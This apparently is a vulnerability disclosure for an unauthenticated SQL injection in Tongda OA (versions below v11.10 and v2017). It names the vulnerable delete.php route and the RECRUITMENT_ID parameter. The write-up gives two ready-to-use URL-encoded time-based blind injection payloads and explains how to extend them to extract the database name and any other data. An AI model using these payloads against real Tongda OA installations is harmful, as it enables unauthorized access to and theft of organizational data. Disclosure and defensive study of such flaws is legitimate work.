Unauthorized SQL injection vulnerability exists in Tongda OA

version:Versions below v11.10 and v2017 versions

Route: general/hr/recruit/recruitment/delete.php

There is an injected parameter: $RECRUITMENT_ID

The code here is very concise. When $RECRUITMENT_ID is not empty, the parameters are directly spliced ​​into the SQL statement. Since it is closed with commas, there is a bypass.

![图片1](https://github.com/OliverWu23/cve/assets/54581402/f5c98454-9f51-4ac7-a04b-7a2c00477027)


We can use Cartesian product blind injection for injection. The following payload can determine that the first character of the database name is t, because it was successfully delayed at 116. The ASCII code 116 also corresponds to the lowercase letter t. By analogy, the database name and any information about the database can be obtained through blind injection.

POC
```
1)%20and%20(substr(DATABASE(),1,1))=char(116)%20and%20(select%20count(*)%20from%20information_schema.columns%20A,information_schema.columns%20B)%20and(1)=(1
```

![图片2](https://github.com/OliverWu23/cve/assets/54581402/a49d7474-e8b6-4c83-905b-5cc0f45123a1)


1)%20and%20(substr(DATABASE(),1,1))=char(115)%20and%20(select%20count(*)%20from%20information_schema.columns%20A,information_schema.columns%20B)%20and(1)=(1

![图片3](https://github.com/OliverWu23/cve/assets/54581402/62b6f53d-f17a-4429-8358-c7cd05e4c3f0)

Intercept the second digit of the database through blind injection, and determine the second digit as the letter d through the delay time.

![图片4](https://github.com/OliverWu23/cve/assets/54581402/3a36432c-157d-4824-a36c-f45d752f246e)
